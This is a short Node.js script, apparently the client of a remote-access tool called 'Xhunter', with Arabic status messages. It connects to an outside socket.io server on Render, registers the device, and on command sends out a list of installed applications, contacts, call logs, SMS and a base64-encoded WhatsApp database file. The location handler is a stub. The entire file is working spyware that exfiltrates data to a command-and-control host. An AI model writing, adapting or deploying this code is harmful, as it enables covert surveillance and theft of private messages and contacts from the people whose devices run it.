const io = require('socket.io-client');
const os = require('os');
const fs = require('fs');
const path = require('path');

const socket = io('https://xhunter-bsos.onrender.com');

const deviceId = 'device_' + Math.floor(Math.random()*10000);
const model = os.type() + ' ' + os.arch();

socket.emit('join', { id: deviceId, model });

function sendResult(action, data){
  socket.emit(action, { id: deviceId, action, data });
}

socket.on('getInstalledApps', () => {
  let apps = [];
  try {
    if(fs.existsSync('C:/Program Files')) apps = fs.readdirSync('C:/Program Files');
    else if(fs.existsSync('/Applications')) apps = fs.readdirSync('/Applications');
  } catch(e){ apps = ['خطأ في الوصول إلى التطبيقات']; }
  sendResult('getInstalledApps', apps);
});

socket.on('getContacts', () => {
  const contacts = fs.existsSync('contacts.json') ? JSON.parse(fs.readFileSync('contacts.json')) : [];
  sendResult('getContacts', contacts);
});

socket.on('getCallLog', () => {
  const calls = fs.existsSync('calls.json') ? JSON.parse(fs.readFileSync('calls.json')) : [];
  sendResult('getCallLog', calls);
});

socket.on('getSMS', () => {
  const sms = fs.existsSync('sms.json') ? JSON.parse(fs.readFileSync('sms.json')) : [];
  sendResult('getSMS', sms);
});

socket.on('getLocation', () => {
  sendResult('getLocation', { lat: 0, lon: 0 });
});

socket.on('downloadWhatsappDatabase', () => {
  const waPath = path.join(__dirname, 'WhatsAppDB.db');
  if(fs.existsSync(waPath)){
    const data = fs.readFileSync(waPath).toString('base64');
    sendResult('downloadWhatsappDatabase', data);
  } else sendResult('downloadWhatsappDatabase', 'ملف غير موجود');
});

console.log("عميل Xhunter جاهز ويرسل البيانات للسيرفر على Render.");
